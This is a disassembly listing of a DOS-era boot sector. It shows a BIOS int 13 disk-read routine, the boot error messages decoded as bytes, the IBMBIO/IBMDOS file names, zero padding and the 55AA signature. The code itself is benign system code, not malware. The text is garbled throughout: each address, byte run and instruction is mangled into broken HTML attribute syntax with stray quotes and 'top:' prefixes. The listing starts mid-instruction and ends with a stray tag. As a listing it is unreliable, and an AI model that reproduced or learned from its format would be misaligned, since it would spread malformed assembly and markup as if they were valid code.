f7361a7c="" div="" w/[7c1a]="" top:1049="" 88162a7c="" mov="" [7c2a],dl="" top:104d="" a3397c="" mov="" [7c39],ax="" top:1050="" c3="" ret="" top:1051="" b402="" mov="" ah,02="" top:1053="" 8b16397c="" mov="" dx,[7c39]="" top:1057="" b106="" mov="" cl,06="" top:1059="" d2e6="" shl="" dh,cl="" top:105b="" 0a363b7c="" or="" dh,[7c3b]="" top:105f="" 8bca="" mov="" cx,dx="" top:1061="" 86e9="" xchg="" ch,cl="" top:1063="" 8a16fd7d="" mov="" dl,[7dfd]="" top:1067="" 8a362a7c="" mov="" dh,[7c2a]="" top:106b="" cd13="" int="" 13="" top:106d="" c3="" ret="" top:106e="" 0d0a4e="" or="" ax,4e0a="" top:1071="" 6f="" outsw="" top:1072="" 6e="" outsb="" top:1073="" 2d5379="" sub="" ax,7953="" top:1076="" 7374="" jnc="" 10ec="" top:1078="" 65="" db="" 65="" top:1079="" 6d="" insw="" top:107a="" 206469="" and="" [si+69],ah="" top:107d="" 736b="" jnc="" 10ea="" top:107f="" 206f72="" and="" [bx+72],ch="" top:1082="" 206469="" and="" [si+69],ah="" top:1085="" 736b="" jnc="" 10f2="" top:1087="" 206572="" and="" [di+72],ah="" top:108a="" 726f="" jc="" 10fb="" top:108c="" 720d="" jc="" 109b="" top:108e="" 0a5265="" or="" dl,[bp+si+65]="" top:1091="" 706c="" jo="" 10ff="" top:1093="" 61="" popa="" top:1094="" 636520="" arpl="" [di+20],sp="" top:1097="" 61="" popa="" top:1098="" 6e="" outsb="" top:1099="" 64="" db="" 64="" top:109a="" 207374="" and="" [bp+di+74],dh="" top:109d="" 7269="" jc="" 1108="" top:109f="" 6b652061="" imul="" sp,[di+20],0061="" top:10a3="" 6e="" outsb="" top:10a4="" 7920="" jns="" 10c6="" top:10a6="" 6b657920="" imul="" sp,[di+79],0020="" top:10aa="" 7768="" ja="" 1114="" top:10ac="" 65="" db="" 65="" top:10ad="" 6e="" outsb="" top:10ae="" 207265="" and="" [bp+si+65],dh="" top:10b1="" 61="" popa="" top:10b2="" 64="" db="" 64="" top:10b3="" 790d="" jns="" 10c2="" top:10b5="" 0a00="" or="" al,[bx+si]="" top:10b7="" 0d0a44="" or="" ax,440a="" top:10ba="" 69736b2042="" imul="" si,[bp+di+6b],4220="" top:10bf="" 6f="" outsw="" top:10c0="" 6f="" outsw="" top:10c1="" 7420="" jz="" 10e3="" top:10c3="" 66="" db="" 66="" top:10c4="" 61="" popa="" top:10c5="" 696c757265="" imul="" bp,[si+75],6572="" top:10ca="" 0d0a00="" or="" ax,000a="" top:10cd="" 49="" dec="" cx="" top:10ce="" 42="" inc="" dx="" top:10cf="" 4d="" dec="" bp="" top:10d0="" 42="" inc="" dx="" top:10d1="" 49="" dec="" cx="" top:10d2="" 4f="" dec="" di="" top:10d3="" 2020="" and="" [bx+si],ah="" top:10d5="" 43="" inc="" bx="" top:10d6="" 4f="" dec="" di="" top:10d7="" 4d="" dec="" bp="" top:10d8="" 49="" dec="" cx="" top:10d9="" 42="" inc="" dx="" top:10da="" 4d="" dec="" bp="" top:10db="" 44="" inc="" sp="" top:10dc="" 4f="" dec="" di="" top:10dd="" 53="" push="" bx="" top:10de="" 2020="" and="" [bx+si],ah="" top:10e0="" 43="" inc="" bx="" top:10e1="" 4f="" dec="" di="" top:10e2="" 4d="" dec="" bp="" top:10e3="" 0000="" add="" [bx+si],al="" top:10e5="" 0000="" add="" [bx+si],al="" top:10e7="" 0000="" add="" [bx+si],al="" top:10e9="" 0000="" add="" [bx+si],al="" top:10eb="" 0000="" add="" [bx+si],al="" top:10ed="" 0000="" add="" [bx+si],al="" top:10ef="" 0000="" add="" [bx+si],al="" top:10f1="" 0000="" add="" [bx+si],al="" top:10f3="" 0000="" add="" [bx+si],al="" top:10f5="" 0000="" add="" [bx+si],al="" top:10f7="" 0000="" add="" [bx+si],al="" top:10f9="" 0000="" add="" [bx+si],al="" top:10fb="" 0000="" add="" [bx+si],al="" top:10fd="" 0055aa="" add="" [di-56],dl=""></e#>